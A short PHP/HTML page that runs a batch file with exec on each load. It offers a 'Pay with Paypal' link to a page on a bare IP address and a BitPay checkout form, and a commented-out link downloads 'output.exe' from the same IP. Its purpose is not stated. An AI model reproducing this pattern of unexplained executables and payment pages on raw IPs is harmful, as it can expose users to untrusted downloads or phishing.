<center>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>

<?php
echo exec("run.bat");

echo '<br/>';

#echo ("Continue to Payment: ");
#echo '<a href="http://138.91.138.253/Test/uploads/output.exe">Download File</a>'
echo '<a href="http://138.91.138.253/Test/uploads/paypal.html">Pay with Paypal</a>';

echo '<br/>';
echo '<br/>';
echo ("Pay with Bitcoin");
?>

<form action="https://bitpay.com/checkout" method="post" >
  <input type="hidden" name="action" value="checkout" />
  <input type="hidden" name="posData" value="" />
  <input type="hidden" name="data" value="QhRe1raZ9qtqqTPkRwGjVWKrhCitCYqU0w5RAmfizQS6oRG9uDlHJa7n2nmViJLtp1BVB8MleqNTvu031gYAiE7IrldLfTGKIE390WfxcX1GryhDrz4VEHE9nEWmPMAqKv/+4mvsCiJm7VtfvsmfBzLuocUamjbO29PNpDxaR4+rCIZtK/GbkQDz/+F4MmbjC9Pcb4p+aO1czfkv2dzWa44IMylfBrfTs0hNuZxKMfspsAFHAYbcRldrnqOjgrFYW8lveC4biVvxj9OZA3iwSSbmiIqIRJLKskwIl80yWFXUWNgKy481nuYzI9uRY+Ck" />
  <input type="image" src="https://bitpay.com/img/button8.png" border="0" name="submit" alt="BitPay, the easy way to pay with bitcoins." >
</form>

</center>